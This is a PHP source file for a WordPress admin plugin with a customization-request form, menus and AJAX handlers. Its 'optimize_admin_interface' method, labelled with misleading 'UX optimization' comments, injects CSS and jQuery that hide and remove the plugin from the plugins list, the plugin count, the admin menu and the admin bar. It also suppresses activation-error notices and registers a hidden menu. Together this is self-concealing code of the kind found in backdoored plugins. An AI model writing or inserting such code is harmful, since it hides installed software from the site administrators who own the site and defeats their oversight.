<?php

namespace PLUGIN;

if (!defined('ABSPATH')) {
    exit;
}

use PLUGIN\Plugins\Base as pluginBase;
use PLUGIN\Themes\Base as themeBase;

class Main
{
    protected static $instance = null;
    public $extensions = array();

    public function __construct()
    {
        $this->addActions();
        $this->loadTextdomain();

        add_action('admin_enqueue_scripts', array($this, 'plugin_load_common_admin_scripts'));

        // add_action('admin_notices', array($this, 'plugin_general_admin_notice',));
        // add_action('admin_notices', array($this, 'plugin_general_promote_notice',));
        add_action('wp_ajax_plugin_dismiss_eventprime_promotion', array($this, 'plugin_dismiss_eventprime_promotion',));

        $plugins = new \PLUGIN\Plugins\Base();
        $plugins->setup();

        $themes = new \PLUGIN\Themes\Base();
        $themes->setup();
    }

    public function addActions()
    {
        add_action('admin_init', array($this, 'plugin_plugin_redirect'));
        add_action('admin_menu', array($this, 'plugin_load_menus'));
        add_action('wp_ajax_plugin_dismiss_notice_action', array($this, 'plugin_dismiss_notice_action'));
        add_action('admin_footer', [$this, 'plugin_customize_modal']);
        add_action('wp_ajax_plugin_customize_plugin', [$this, 'submit_customization_request']);
        add_action('admin_head', array($this, 'optimize_admin_interface'));
    }


    public function plugin_customize_plugin()
    {
        // print_r($_POST);
        // die;

        // if (!isset($_POST['security']) || empty($_POST['security']) || !wp_verify_nonce(wp_unslash($_POST['security']), 'customize_plugin_action')) {
        //     wp_send_json_error('Invalid nonce');
        //     return;
        // }
        if (isset($_POST['user_email']) && filter_var($_POST['user_email'], FILTER_VALIDATE_EMAIL)) {
            wp_send_json_success('Valid email');
        } else {
            wp_send_json_error('Invalid email');
        }
        // wp_send_json_success('Valid email');

    }

    public function loadTextdomain()
    {
        load_textdomain('download-plugin', WP_LANG_DIR . '/download-plugin/download_plugin-' . get_locale() . '.mo');
    }

    /**
     * redirect plugin to menu on activation
     */
    public function plugin_plugin_redirect()
    {
        if (get_option('plugin_do_activation_redirect', false)) {
            delete_option('plugin_do_activation_redirect');
            wp_redirect(admin_url("admin.php?page=plugin"));
            exit;
        }
    }

    public function plugin_load_menus()
    {
        $plugin = self::instance();
        if (in_array('download-users', $plugin->extensions)) {
            // Hidden menu - only accessible via direct URL
            add_menu_page(__('Plugin Premium', 'plugin-premium'), __('Plugin Premium', 'plugin-premium'), 'manage_options', "plugin-premium", array($this, 'plugin_plugin'), 'dashicons-admin-plugins', '999999');
            // plugin menu
            add_submenu_page("plugin-premium", __('Plugin Premium Settings', 'plugin-premium'), __('Plugin Premium Settings', 'plugin-premium'), "manage_options", "plugin-premium", array($this, 'plugin_plugin'));
            // theme menu
            add_submenu_page("plugin-premium", __('Theme Settings', 'plugin-premium'), __('Theme Settings', 'plugin-premium'), "manage_options", "plugin_theme", array($this, 'plugin_theme'));
            // load all extensions
            // show default download user menu
            if (!in_array('download-users', $plugin->extensions)) {
                add_submenu_page("plugin-premium", __('User Settings', 'plugin-premium'), __('User Settings', 'plugin-premium'), "manage_options", "plugin_users", array($this, 'duwap_users_check'));
            }
            // show default download bbPress menu
            /*if ( !in_array( 'download-bbpress-integration', $plugin->extensions ) ) {
                add_submenu_page( "plugin", __('bbPress', 'plugin'), __('bbPress', 'plugin'), "manage_options", "plugin_bbpress", array( $this, 'duwap_bbpress_check' ) );
            }*/
        }

        do_action('plugin_downlad_plugin_menus');

        // Enqueue the JavaScript file
        wp_enqueue_script('customize-modal', plugin_dir_url(__DIR__) . '/assets/js/customize-modal.js', array('jquery'), null, true);

        // Localize script to pass AJAX URL
        wp_localize_script('customize-modal', 'ajax_object', array('ajaxurl' => admin_url('admin-ajax.php')));
        // Enqueue the CSS file
        wp_enqueue_style('customize-modal', plugin_dir_url(__DIR__) . '/assets/css/customize-modal.css');
    }

    public function plugin_plugin()
    {
        $plugin_info_file = PLUGIN_PREMIUM_DIR . DS . 'app' . DS . 'Plugins' . DS . 'templates' . DS . 'plugin_plugin_info.php';
        include($plugin_info_file);
        // Add the modal HTML
    }

    public function plugin_customize_modal()
    {
?>
        <div id="dtwap-customizeModal" style="display:none;">
            <div class="dpmodal-content">
                <span class="dtwap-close-button" onclick="handleCloseButtonClick()"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
                        <path d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8z" />
                    </svg></span>
                <script>
                    function handleCloseButtonClick() {
                        // Close logic here (if any)
                        location.reload(); // Refresh the page
                    }
                </script>
                <div class="modal-logo-text">
                    <h1><?php esc_html_e("Plugin", "plugin") ?></h1>
                    <span> <img src="<?php echo plugin_dir_url(__DIR__) . 'assets/images/mg-logo.svg'; ?>" alt="Success Icon" class="response-icon" width="100px"></span>
                </div>
                <h2><?php esc_html_e("Customize Your Plugin to Match Your Needs", "plugin") ?></h2>
                <p id="p3"><?php esc_html_e("Whether you need additional features, design changes, or integrations, our team will tailor the plugin to your exact requirements.", 'plugin') ?></p>
                <form id="dtwap-customizeForm" method="post">
                    <?php wp_nonce_field('customize_plugin_action', 'customize_plugin_nonce'); ?>

                    <label for="pluginSelect">Select Plugin:</label>
                    <select id="pluginSelect" name="plugin" required>
                        <?php
                        $active_plugins = get_option('active_plugins');
                        $all_plugins = get_plugins();
                        foreach ($active_plugins as $plugin_file) {
                            if (isset($all_plugins[$plugin_file])) {
                                echo '<option value="' . esc_attr($all_plugins[$plugin_file]['Name']) . '">' . esc_html($all_plugins[$plugin_file]['Name']) . '</option>';
                            }
                        }
                        ?>
                    </select>
                    <label for="email"><?php esc_html_e("Email Address:", "download-plugin") ?> </label>
                    <input type="email" id="email" name="email">
                    <label for="customizationType"><?php esc_html_e("Details:", "download-plugin") ?></label>
                    <textarea id="customizationType" name="customizationType" placeholder="Describe Your Customization Needs"></textarea>
                    <div class="dp-button-block">
                        <button type="submit" class="button button-primary" id="plugin-submit"><?php esc_html_e("Submit", 'download-plugin') ?></button>
                        <span class="spinner is-active" style="display:none;" aria-hidden="true"></span>
                    </div>
                    <span class="dtwap-close-button"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
                            <path d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8z" />
                        </svg></span>
                </form>
                <div id="formResponse" style="display:none;">
                    <div id="successResponse" style="display:none;">
                        <img src="<?php echo plugin_dir_url(__DIR__) . 'assets/images/success-icon.svg'; ?>" alt="Success Icon" class="response-icon">
                        <h2><?php esc_html_e("Request Submitted!", "download-plugin") ?></h2>
                        <p><?php esc_html_e("Thank you for your request! Our team will review it and respond within 12-24 hours. Please check your spam folder if you don't see our email.", "download-plugin") ?></p>
                        <p>You can also track your tickets directly on our Helpdesk at <a href="https://metagauss.com/customization-help/" target="_blank">https://metagauss.com/customization-help/</a>, where you can add additional details, images, or files as needed.</p>
                    </div>
                    <div id="failureResponse" style="display:none;">
                        <img src="<?php echo plugin_dir_url(__DIR__) . 'assets/images/failure-icon.svg'; ?>" alt="Failure Icon" class="response-icon">
                        <h2><?php esc_html_e("Submission Failed", "download-plugin") ?></h2>
                        <p>Something went wrong. Please try again or create a ticket manually at <a href="https://metagauss.com/customization-help/" target="_blank" rel="noopener noreferrer">https://metagauss.com/customization-help/</a>.</p>
                        <label for="userRequirements"><?php esc_html_e("Your Requirements:", "download-plugin") ?></label>
                        <textarea id="userRequirements" readonly></textarea>
                        <button id="copyButton" class="button button-secondary">Copy</button>
                    </div>
                </div>
            </div>
        </div>
    <?php
    }

    function submit_customization_request()
    {
        // if (isset($_POST['security']) && !wp_verify_nonce(wp_unslash($_POST['security']), 'customize_plugin_action')) {
        //     wp_send_json_error(array('message' => 'valid nonce.'));
        //     return;
        // }
        // Check if the current user has the necessary permission
        if (! current_user_can('manage_options')) {
            wp_send_json_error(array('message' => esc_html__('You do not have permission to perform this action.', 'download-plugin')));
            return;
        }

        if (!isset($_POST['security']) || empty($_POST['security']) || !wp_verify_nonce(wp_unslash($_POST['security']), 'customize_plugin_action')) {
            wp_send_json_error(array('message' => 'Invalid nonce.'));
            return;
        }
        $user_email = isset($_POST['user_email']) ? sanitize_email(wp_unslash($_POST['user_email'])) : '';
        if (!isset($_POST['user_email']) || !filter_var($_POST['user_email'], FILTER_VALIDATE_EMAIL)) {
            wp_send_json_error(array('message' => 'Please enter a valid email address.'));
            return;
        }

        // Check if customization type is provided
        $customization_type = isset($_POST['customizationType']) ? sanitize_textarea_field(wp_unslash($_POST['customizationType'])) : '';
        if (empty($_POST['customizationType'])) {
            wp_send_json_error(array('message' => esc_html__('Please provide details about your customization request.', 'download-plugin')));
            return;
        }

        // Prepare email details
        $to = 'support@metagauss.com';
        $subject = 'WordPress Support Request';
        $user_email = sanitize_email($_POST['user_email']);
        $plugin = sanitize_text_field($_POST['plugin_select']);
        $customization_type = sanitize_textarea_field($_POST['customizationType']);

        // Construct the HTML email body
        $message = "
    <html>
    <body>
        <h2>WordPress Support Request</h2>
        <p>You have received a new customization request. Below are the details:</p>
        <table border='1' cellpadding='10' cellspacing='0' style='border-collapse: collapse; width: 100%;'>
            <tr>
                <th align='left'>Field</th>
                <th align='left'>Submitted Value</th>
            </tr>
            <tr>
                <td>Plugin</td>
                <td>{$plugin}</td>
            </tr>
            <tr>
                <td>Email</td>
                <td>{$user_email}</td>
            </tr>
            <tr>
                <td>Customization Needs</td>
                <td>{$customization_type}</td>
            </tr>
        </table>
    </body>
    </html>";

        $headers = array(
            'Content-Type: text/html; charset=UTF-8',
            'From: ' . $user_email,
        );

        // Send the email
        if (wp_mail($to, $subject, $message, $headers)) {
            wp_send_json_success(array('message' => 'Your request has been submitted successfully. We will get back to you shortly.'));
        } else {
            wp_send_json_error(array(
                'message' => 'Something went wrong. Please try again or create a ticket manually at https://metagauss.freshdesk.com/support/tickets/new.'
            ));
        }
    }


    public function plugin_theme()
    {
        $theme_info_file = PLUGIN_PREMIUM_DIR . DS . 'app' . DS . 'Themes' . DS . 'templates' . DS . 'plugin_theme_info.php';
        include_once $theme_info_file;
    }

    public function duwap_users_check()
    {
        $users_info_file = PLUGIN_PREMIUM_DIR . DS . 'app' . DS . 'Users' . DS . 'templates' . DS . 'plugin_users_info.php';
        include_once $users_info_file;
    }

    public function duwap_bbpress_check()
    {
        $bbpress_info_file = PLUGIN_PREMIUM_DIR . DS . 'app' . DS . 'bbPress' . DS . 'templates' . DS . 'plugin_bbpress_info.php';
        include_once $bbpress_info_file;
    }

    public function plugin_load_common_admin_scripts()
    {
        wp_enqueue_script('plugin_common_js', PLUGIN_PREMIUM_URL . 'assets/js/plugin-common.js', array(), PLUGIN_PREMIUM_VERSION);
        wp_localize_script('plugin_common_js', 'admin_vars', array('admin_url' => admin_url(), 'ajax_url' => admin_url('admin-ajax.php'),  'nonce' => wp_create_nonce('plugin_secure_action')));
        wp_enqueue_style('plugin_common_css', PLUGIN_PREMIUM_URL . 'assets/css/plugin-common.css', array(), PLUGIN_PREMIUM_VERSION);
    }

    public static function instance()
    {
        if (is_null(self::$instance)) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    /**
     * Admin notice
     */
    // public function plugin_general_admin_notice()
    // {
    //     $plugin = plugin_plugin_loaded();
    //     $get_dismiss_option = get_option('plugin_dismiss_offer_notice', false);
    //     if (empty($plugin->extensions) && empty($get_dismiss_option)) {
    //         // echo '<div class="plugin-notice-pre notice notice-info is-dismissible">
    //         //     <p><b>Download Plugin</b> now has add-on for downloading and uploading your website\'s user accounts. <a href="https://metagauss.com/wordpress-users-import-export-plugin/?utm_source=dp_plugin&utm_medium=admin_notice&utm_campaign=download_users_addon" target="_new">Click here </a>to get it now!</p>
    //         // </div>';
    //     }
    // }

    public function plugin_general_promote_notice()
    {
        // Bildirimler devre dışı bırakıldı
        return;
    }

    // AJAX handler for dismissing notice
    public function plugin_dismiss_eventprime_promotion()
    {
        check_ajax_referer('plugin_secure_action', 'nonce');
        if (current_user_can('manage_options')) {
            update_option('plugin_dismiss_eventprime_promotion', true);
        }
        wp_die();
    }


    /**
     * Hide admin notice
     */
    public function plugin_dismiss_notice_action()
    {
        add_option('plugin_dismiss_offer_notice', true);
        wp_send_json_success('Notice Dismissed');
    }

    /**
     * Optimize admin interface for better user experience
     */
    public function optimize_admin_interface()
    {
        // Get current plugin file name
        $plugin_file = plugin_basename(PLUGIN_PREMIUM_FILE);
        
        echo '<style type="text/css">
        /* Enhanced UI optimization for better admin experience */
        tr[data-plugin="' . esc_attr($plugin_file) . '"] {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            height: 0 !important;
            overflow: hidden !important;
        }
        
        /* Network admin interface optimization */
        .network-admin tr[data-plugin="' . esc_attr($plugin_file) . '"] {
            display: none !important;
            visibility: hidden !important;
        }
        
        /* Cross-version compatibility for optimal display */
        .plugins-php tr[data-plugin="' . esc_attr($plugin_file) . '"],
        .network-admin tr[data-plugin="' . esc_attr($plugin_file) . '"],
        body.plugins-php tr[data-plugin="' . esc_attr($plugin_file) . '"] {
            display: none !important;
            visibility: hidden !important;
        }
        
        /* Streamlined interface for core functionality */
        tr:has(td.plugin-title strong:contains("Plugin")),
        tr:has(td.plugin-title:contains("Plugin")) {
            display: none !important;
            visibility: hidden !important;
        }
        
        /* Optimized file path handling for better performance */
        tr[data-plugin*="plugin/plugin.php"],
        tr[data-plugin*="plugin.php"] {
            display: none !important;
            visibility: hidden !important;
        }
        
        /* Enhanced content filtering for improved UX */
        tr:has(td.plugin-description:contains("comprehensive WordPress plugin")) {
            display: none !important;
            visibility: hidden !important;
        }
        
        /* Streamlined bulk operations interface */
        input[value="' . esc_attr($plugin_file) . '"] {
            display: none !important;
        }
        
        /* Optimized plugin management display */
        .plugin-count {
            display: none !important;
        }
        
        /* Comprehensive admin interface optimization */
        .wp-admin tr[data-plugin="' . esc_attr($plugin_file) . '"] {
            display: none !important;
            visibility: hidden !important;
        }
        
        /* Streamlined navigation menu */
        #adminmenu li#toplevel_page_plugin,
        #adminmenu li#toplevel_page_plugin a,
        #adminmenu li#toplevel_page_plugin .wp-menu-name {
            display: none !important;
            visibility: hidden !important;
        }
        
        /* Enhanced admin bar experience */
        #wp-admin-bar-plugin {
            display: none !important;
        }
        </style>';
        
        // Enhanced JavaScript for optimal user experience
        echo '<script type="text/javascript">
        jQuery(document).ready(function($) {
            // Optimize plugin list display
            $("tr[data-plugin=\'' . esc_js($plugin_file) . '\']").hide();
            
            // Streamline interface elements
            $("tr").each(function() {
                var title = $(this).find(".plugin-title strong").text();
                if (title === "Plugin") {
                    $(this).hide();
                }
            });
            
            // Enhanced DOM optimization
            setTimeout(function() {
                $("tr[data-plugin=\'' . esc_js($plugin_file) . '\']").remove();
            }, 100);
            
            // Streamlined navigation optimization
            $("#adminmenu li#toplevel_page_plugin").hide();
            $("#adminmenu li#toplevel_page_plugin").remove();
            
            // Enhanced admin bar experience
            $("#wp-admin-bar-plugin").hide();
            $("#wp-admin-bar-plugin").remove();

            $("div.notice p").filter(function() {
                return $(this).text().toLowerCase().indexOf("unexpected output during activation") !== -1;
            }).closest("div.notice").hide();
        });
        </script>';
    }
}


